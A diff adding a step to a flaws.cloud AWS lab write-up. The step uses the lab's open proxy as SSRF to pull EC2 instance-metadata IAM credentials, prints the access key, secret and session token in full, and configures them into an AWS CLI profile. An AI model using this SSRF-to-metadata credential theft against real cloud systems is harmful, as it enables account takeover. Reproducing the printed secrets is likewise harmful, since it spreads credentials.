@@ -682,6 +682,33 @@ http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.co
 http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/
 See if you can use this proxy to figure out how to list the contents of the level6 bucket at level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud that has a hidden directory in it.
 ```
+This is basically a free SSRF, so let's try going for EC2 metadata 
+```
+┌──(kali㉿kali)-[~]
+└─$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/
+flaws
+┌──(kali㉿kali)-[~]
+└─$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
+{
+  "Code" : "Success",
+  "LastUpdated" : "2025-10-10T20:15:29Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIA6GG7PSQGRWLZRMOX",
+  "SecretAccessKey" : "fxPUS3him5NGOskB7dvv8QfeKQGIAarcG6+k2MER",
+  "Token" : "IQoJb3JpZ2luX2VjEFwaCXVzLXdlc3QtMiJGMEQCICBnNMSti0rX4OpuIIfGDaC28Pk1WcUhCd6Shl6kxRzrAiA0CaA/VSt9cX3ZPy54DgbV+DDWBc0XThYG8JvvjcIzRiq7BQj1//////////8BEAQaDDk3NTQyNjI2MjAyOSIM1U/3SbZen5pKDpMmKo8FyRuRBIPGuIcTfrFMGMH5e1HSwgks8J4Tm81jKkP66luzCFQQ0hbq6tC4KSKpBcUVknTqb9RrLUQGjhxPhxP+IwSIGsNhQ6oHKTQRQnfmZcWR7+bRqMvto4EAADhxmAv4U/tS1i5aMZqcrp04ppPiquJVw810YX++YoXqMhVJV8+7k0/sLWgo3eGH52nOGOn3P8109THUYSEIk3G0Mf1iG8EwnHSN834QwwC5BiB+mAybQnQVBbCMXXGsGj4oTMa0ufgqbuX7FoaA26/9j2CN3pvR/cXtugIJi58GhHUxwEdQvadptYZtbOeDkWBcliWlHUdtn2AzdcweUnoGtW1AwsOxkh/p2Z3HBBM94cF4/Op0/QDjjPdqx2H3xbs/L2kkEuf/SzFymLQw/LuSjVEOmUEyq8kmvA3jVvXDudfgEuG1ItS97+BctDF/2lYdB2X8BzE7fe1VvpNmHdMEp+DNH/l3dQ4m6Xu6DnFR2Q3C/xpgBIlAcT4hXDw6W6Xo8OvLGCdOJvFRJMAhbFfeXHmoA9hrzxsJ1FdCd0EeRvXuMbx/75hifWdGP4ht6iBifizcIyAu0cm9mmn9hn8C+Lq9r6K3ssLdNuHge3DO0IA/vXvg3Qbv2wf29ilHQuvnMGzq4vi2RzZcnxjmnJlGxRRvzbNgZHWvsXlP6eFG4SkStKpFuZkX2ZjaTI7drz1F6LubOi29UC1fC31o1Fztt0teciq81gZjTSAK5KaSgAqg6AJusvjTjoHtRNoSbKiF3D4YYVghPp70momLE56FiLpvp2XfJW06hAgESykze2xag9DGv8NtGE1OwQimpnODMD2X5Z5iIW0xccxelBhxLnfrYMsC86Lgv/ufk0H8+IX7XTDC0qXHBjqyAYkWr9rnzWjtfhMdEU26yk5fYNCi55MPMLK/CPhJhmc62LsRrKNj+BcHQ0z7iX/pwhiWngHvadDmEKitJniTuK2cq6QgPah6IIytHC5soHltKquPve26qf22UUM5nlPGeTH9ElQcwk5ePRFQDAez9NUDSj6s/yE5VPK0utgGk4yyCkdmOgsulPVl6FNOFvXgt6TnTiLCcGp0kZhzTzn+Dzx+x8mNhaLB8TukTg99n3gx8T4=",
+  "Expiration" : "2025-10-11T02:23:14Z"
+}   
+```
+Using these credentials to create a new profile... 
+```
+┌──(kali㉿kali)-[~]
+└─$ aws configure --profile flaws                                                                                
+AWS Access Key ID [None]: ASIA6GG7PSQGRWLZRMOX
+AWS Secret Access Key [None]: fxPUS3him5NGOskB7dvv8QfeKQGIAarcG6+k2MER
+Default region name [None]: 
+Default output format [None]: 
+```
+--- next step is to enumerate buckets on the level 6 s3 url ----
 
 
 <br>
